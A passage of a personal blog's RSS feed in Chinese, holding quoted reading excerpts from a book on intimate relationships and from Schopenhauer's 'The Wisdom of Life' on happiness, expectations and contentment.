fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;如果孩子生活在持续发生冲突的家庭，父母不离婚则会使他们的情况更糟糕&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;当和平的婚姻破裂时，孩子就会受到伤害；如果家庭充满冲突，则离婚倒会让孩子的境况变得更好&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;如果子女能够免于贫困，得到充满关爱的、可靠的和一致的养育，并远离父母冲突带来的伤害，他们就能快乐地成长&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人们通常期望男性具有果断自信、自强自立而非温情脉脉、温柔体贴的行为风格，而这种行为风格并不能将他们培养成长期亲密关系中非常理想的伴侣&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;临近、熟识和方便是决定具有奖赏价值的亲密关系能否开始的重要因素。可能我们与许多人都能建立美满的亲密关系，只不过我们与他们永远不会相遇&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们并不像自己以为的那样了解或理解自己的伴侣；即使在成功的亲密关系中，仍存在很多误解&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;从长远来看，亲密关系的代价往往比我们预期的要大得多。如果你认为你的亲密关系将带给你源源不断的幸福和喜悦，你肯定会失望&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;约三分之一的人不能轻松舒适地对待相互依赖的亲密感；他们要么担心伴侣不够爱自己，要么在伴侣太亲近时感觉不自在&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;幸福的恋人宽容地看待自己的伴侣及其行为，在有疑问时选择相信伴侣，即使伴侣偶尔行为不当，也仍然认为他们是善良体贴的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在幸福的亲密关系中，当激情减退时，取而代之的是一种深厚、饱含感情的友谊，这种友谊对身处其中的人来说丰富、温暖且令人满意。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;也许最重要的是，如果我们努力，几乎所有人都能成为更体贴、更有魅力、更有价值的伴侣。当男性有动力进行非言语沟通时，他们会在这方面做得更好。如果我们能花时间检查自己理解的准确性，就能减少或消除言语上的误解。只要用心去做，我们就可以在对待伴侣时更礼貌、更无私、更体贴、更少挑剔。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;对一段伴侣关系做出承诺、希望并期望这段关系继续下去的人，其思维和行为方式都不同于承诺较少的伴侣(Ogolsky &amp;amp; Bowers, 2013)。当他们预见到与伴侣未来的幸福生活时(Lemay, 2016)，他们会以有助于维系伴侣关系的方式看待自己、伴侣及双方关系，并且以能够避免或化解冲突、充实亲密关系的方式行事。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;</description>
    </item>
    <item>
      <title>《人生的智慧》</title>
      <link>http://localhost:1313/posts/read_rsdzh/</link>
      <pubDate>Thu, 23 Oct 2025 23:40:32 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_rsdzh/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们不应为某件事情过分高兴或者过分悲伤，原因之一就是一切事物都在改变，另一个原因是我们对于何为有利、何为不利的判断是虚幻的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们幸福的原因存在于我们的自身之内，而不是自身之外&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人的内心快乐抑或内心痛苦首先就是人的感情、意欲和思想的产物。而人自身之外的所有事物，对于人的幸福都只是间接地发挥影响&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们唯一能够做到的就是尽可能充分地利用我们既定的个性。因此，我们应该循着符合我们个性的方向，努力争取适合个性的发展，除此之外则一概避免。所以，我们必须选择与我们个性相配的地位、职业和生活方式&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个人的个性及其价值，才唯一直接与他的幸福有关&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;保持身体健康的手段无非就是避免一切纵欲放荡的行为、令人不快和剧烈的情绪动荡，以及长时间紧张的精神劳累；每天至少在户外进行两个小时的身体快速运动；勤洗冷水浴，饮食有节&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个人自身拥有越丰富，他对身外之物的需求也就越少，别人对他来说就越不重要&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;为了外在的荣耀、地位、头衔和名声而部分或全部奉献出自己的内在安宁、闲暇和独立——这是极度的愚蠢行为&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;缺乏痛苦的程度是衡量一个人生活是否幸福的标准&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;认清幸福是避免痛苦，而不是寻求快乐：我们不应该以痛苦为代价去购买快乐，甚至只是冒着遭受痛苦的风险去这样做也不行，否则，我们就会为了那些否定、因而是虚幻的东西而付出了肯定和实在的东西。但如果我们牺牲欢娱以避免痛苦，那我们肯定获得收益&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;降低对幸福的期待：&#xA;我们对于幸福的过分期待毁坏了这世上的一切，毁坏的程度与我们做梦的程度相一致。谁要是摆脱了过分的期待，除了自己已经拥有的以外，不再奢望更多，那么，他就能够安然无恙地生活下去”（《梅克通信录》）&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;如果你失去一个世界，&#xA;不要为此悲伤，因为这是微不足道的；&#xA;如果得到一个世界，&#xA;不要为此高兴，因为这是微不足道的；&#xA;苦乐得失都会过去&#xA;都会离开这个世界，因为这都是微不足道的。&#xA;——安瓦里：《苏哈里》&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人生智慧的重要一点就是在关注现在和计划将来这两者之间达致恰到好处的平衡，这样，现在与将来才不至于互相干扰&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;不要由于在过去我们的希望落空现在就变得忧郁寡欢，或者为了将来操心伤神以致败坏现时&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们应该时刻记住：此刻时光匆匆消逝化作神奇的往昔，从此以后，它就存留在我们的记忆里，照射出不朽之光芒。在将来，尤其到了糟糕恶劣的日子，我们的记忆就会拉起帷幕：此刻时光就会成为我们内心眷恋和思念的对象。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;如果不跟别人作比较，那我们就会为我们所得到的感到快乐；如果由于别人比我们更加幸运而内心不安，那我们将永远不会快乐&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;对于一切涉及痛苦和快乐的事情，我们应该把牢想象力的闸门&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;通常，为了使现时灰暗的生活生色明快，我们盘算着种种美妙的可能，凭空想象出形形色色的诱人的希望，而所有这些都孕育着失望。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;正如流通的是纸钞，而不是真金白银，同样，在这个世界上，流行的不是发自内心的尊重和真正的友谊，而只是做得尽量逼真和自然地显示尊重和友谊的表面工夫&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“唯一能够取悦别人的方式就是把自己裹以最傻呆的动物的外皮。”显示自己的聪明智慧其实就是间接地指责别人愚蠢和无能&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个明智的人其实就是一个不会被事物恒久不变的表面所欺骗的人，他甚至预见到了事情即将往哪一方向变化&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;帮助我们以镇定自若的态度接受发生在我们身上的不幸和灾祸的最佳方法，莫过于确信这一真理：“发生的所有大大小小的事情，都是必然地发生。”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所有的事物作为客体，亦即纯粹作为表象而存在时，毫无例外都是令人愉快的；但当这些事物作为主体存在，亦即存在于意欲之中时，却都沉浸在痛苦和悲哀之中&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一切事物在被观照时都是愉悦的，但在具体存在时，却是可怕的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; 